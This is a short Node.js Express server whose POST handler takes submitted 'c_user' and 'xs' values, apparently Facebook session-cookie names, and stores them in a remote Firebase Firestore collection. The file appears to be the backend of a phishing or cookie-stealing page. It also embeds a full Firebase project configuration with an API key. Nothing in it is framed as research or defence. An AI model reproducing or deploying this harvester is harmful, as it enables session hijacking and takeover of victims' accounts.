const express = require("express");
const path = require("path");

const PORT = 80;
const bodyParser = require("body-parser");
const { initializeApp } = require('firebase/app')
const { getFirestore, collection, addDoc } = require('firebase/firestore/lite')

const app = express();
app.use(express.static(path.join(__dirname,'/static')));
app.use(express.json());
app.use(bodyParser.urlencoded({ extended: true }));

const firebaseConfig = {
  apiKey: "AIzaSyDEl2fMtn3n0EKd2U_DMOs_Yl9_EdHcmNs",
  authDomain: "ikram-ce70d.firebaseapp.com",
  projectId: "ikram-ce70d",
  storageBucket: "ikram-ce70d.appspot.com",
  messagingSenderId: "289216054724",
  appId: "1:289216054724:web:80b07eb050fb7f51551091",
  measurementId: "G-K7327LG9FC"
};

const firebaseInitialized = initializeApp(firebaseConfig);

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.post("/", async (req, res) => {
  const firestore = getFirestore(firebaseInitialized);

  const collRef = collection(firestore, "pages");


  const uid = req.body.c_user;
  const cookie = req.body.xs;

  await addDoc(collRef, { uid, cookie });


  res.sendFile(path.join(__dirname, "index.html"));

  
});

app.listen(PORT, () => {
  console.log("app started....");
});
